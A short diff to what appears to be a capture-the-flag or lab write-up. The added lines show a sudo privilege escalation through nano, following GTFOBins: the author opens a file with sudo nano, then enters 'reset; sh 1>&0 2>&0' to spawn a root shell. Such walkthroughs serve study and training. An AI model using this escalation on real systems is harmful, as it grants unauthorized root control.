@@ -386,6 +386,15 @@ Ive got sudo permissions on all files
 https://gtfobins.org/gtfobins/nano/#shell
 
 ```python
+sudo nano /etc/firewall.sh
+```
+After opening the editor i can run the steps in gtfo bins
+
+Ill use ctrl+r then ctrl+x then when prompted for a command `reset; sh 1>&0 2>&0`
+
+This spaws a root session
+
+```python
 
 ```
 
